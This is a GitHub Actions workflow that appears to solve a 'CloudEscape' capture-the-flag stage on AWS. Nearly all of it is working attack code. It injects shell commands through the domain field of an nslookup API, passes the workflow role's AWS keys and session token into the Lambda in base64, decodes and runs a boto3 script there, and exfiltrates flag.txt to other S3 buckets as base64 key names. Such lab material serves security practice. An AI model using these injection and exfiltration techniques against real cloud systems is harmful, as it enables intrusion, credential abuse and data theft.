name: CloudEscape Stage 1 - Get Flag v4
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Create presigned URLs
        id: presign
        run: |
          # Create presigned URL for GET flag from codec bucket
          GET_URL=$(python3 -c "
          import boto3
          s3 = boto3.client('s3')
          print(s3.generate_presigned_url('get_object', Params={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'}, ExpiresIn=3600))
          ")
          echo "GET_URL=$GET_URL"

          # Create presigned URL for PUT flag to platform bucket
          PUT_URL=$(python3 -c "
          import boto3
          s3 = boto3.client('s3')
          print(s3.generate_presigned_url('put_object', Params={'Bucket': 'platform-bucket-009661764077-us-east-1', 'Key': 'flag-exfil.txt'}, ExpiresIn=3600))
          ")
          echo "PUT_URL=$PUT_URL"

          # Save to env
          echo "GET_URL=$GET_URL" >> $GITHUB_ENV
          echo "PUT_URL=$PUT_URL" >> $GITHUB_ENV

      - name: Approach A - Lambda own role S3 copy
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"

          # Use Lambda's own role to read flag and write it as a key name to platform bucket
          # The key name = base64(flag) so we can list it from outside
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f --region us-east-1 2>/tmp/e; F=\$(cat /tmp/f 2>/dev/null | base64 -w0); /opt/bin/aws s3 cp /tmp/f s3://platform-bucket-009661764077-us-east-1/\$F --region us-east-1 2>>/tmp/e; /opt/bin/aws s3 cp /tmp/f s3://site781fe43f26b9eba3/flag.txt --region us-east-1 2>>/tmp/e'
          print(json.dumps({'domain': cmd}))
          ")

          echo "=== Approach A: Lambda own role ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 10

      - name: Approach B - Presigned URL curl
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"

          # Use presigned URLs - no creds needed in Lambda, just curl
          # curl GET_URL to download flag, curl PUT_URL to upload it
          PAYLOAD=$(python3 << 'PYEOF'
          import json, os
          get_url = os.environ.get('GET_URL', '')
          put_url = os.environ.get('PUT_URL', '')

          # Shorten URLs if possible - they should be ~800 chars each
          cmd = f'x; curl -s -o /tmp/f "{get_url}" 2>/tmp/e; F=$(cat /tmp/f 2>/dev/null | base64 -w0); curl -s -X PUT -T /tmp/f "{put_url}" 2>>/tmp/e'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )

          echo "=== Approach B: Presigned URLs ==="
          echo "Payload: ${#PAYLOAD} bytes"
          echo "GET_URL length: ${#GET_URL}"
          echo "PUT_URL length: ${#PUT_URL}"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 10

      - name: Approach C - cicdRole creds via /opt/bin/aws
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"

          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)

          # Pass cicdRole creds and use /opt/bin/aws to copy flag
          # Key insight: write flag as KEY NAME to platform bucket so we can list it
          PAYLOAD=$(python3 << 'PYEOF'
          import json, os
          akid = os.environ.get('AKID_B64', '')
          skid = os.environ.get('SKID_B64', '')
          token = os.environ.get('TOKEN_B64', '')

          cmd = f'x; export AWS_ACCESS_KEY_ID=$(echo {akid}|base64 -d); export AWS_SECRET_ACCESS_KEY=$(echo {skid}|base64 -d); export AWS_SESSION_TOKEN=$(echo {token}|base64 -d); export AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f --region us-east-1 2>/tmp/e; F=$(cat /tmp/f 2>/dev/null|base64 -w0); /opt/bin/aws s3 cp /tmp/f s3://platform-bucket-009661764077-us-east-1/$F --region us-east-1 2>>/tmp/e'
          print(json.dumps({'domain': cmd}))
          PYEOF
          )

          echo "=== Approach C: cicdRole creds ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12

      - name: Check results
        run: |
          echo "===== Platform bucket listing ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
          
          echo "===== Site bucket listing ====="
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
          
          echo "===== Codec bucket listing ====="
          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1
          
          echo "===== CloudFront ====="
          # Try to read flag.txt via CloudFront
          curl -s "https://d67nf28gqfurd.cloudfront.net/flag.txt" 2>&1 | head -5
          echo
          curl -s "https://d67nf28gqfurd.cloudfront.net/" 2>&1 | head -10

      - name: Approach D - boto3 inline with cicdRole
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"

          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)

          # Minimal boto3 script - just get_object and put_object with key=base64(flag)
          cat > /tmp/m.py << 'PYEOF'
          import os,base64,boto3
          a=base64.b64decode(os.environ['A']).decode()
          s=base64.b64decode(os.environ['S']).decode()
          t=base64.b64decode(os.environ['T']).decode()
          se=boto3.Session(aws_access_key_id=a,aws_secret_access_key=s,aws_session_token=t,region_name='us-east-1')
          c=se.client('s3')
          r=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')
          f=r['Body'].read()
          k=base64.b64encode(f).decode()
          c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key=k,Body=f)
          c.put_object(Bucket='site781fe43f26b9eba3',Key='flag.txt',Body=f)
          PYEOF

          SCRIPT_B64=$(base64 -w0 /tmp/m.py)

          export AKID_B64 SKID_B64 TOKEN_B64 SCRIPT_B64
          PAYLOAD=$(python3 << 'PYEOF'
          import json,os
          a=os.environ['AKID_B64'];s=os.environ['SKID_B64'];t=os.environ['TOKEN_B64'];sc=os.environ['SCRIPT_B64']
          cmd=f'x;export A={a} S={s} T={t};echo {sc}|base64 -d>/tmp/m.py;python3 /tmp/m.py 2>&1'
          print(json.dumps({'domain':cmd}))
          PYEOF
          )

          echo "=== Approach D: boto3 inline ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12

      - name: Final check
        run: |
          echo "===== Platform bucket ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
          
          echo "===== Site bucket ====="
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
          
          echo "===== Decode any base64 keys ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 --query 'Contents[].Key' --output text 2>&1 | tr '\t' '\n' | while read key; do
            echo "Key: $key"
            echo "$key" | base64 -d 2>/dev/null && echo " -> DECODED FLAG"
          done
          
          echo "===== CloudFront flag.txt ====="
          curl -s "https://d67nf28gqfurd.cloudfront.net/flag.txt" 2>&1 | head -5
          echo
          
          echo "===== CloudFront root ====="
          curl -s "https://d67nf28gqfurd.cloudfront.net/" 2>&1 | head -10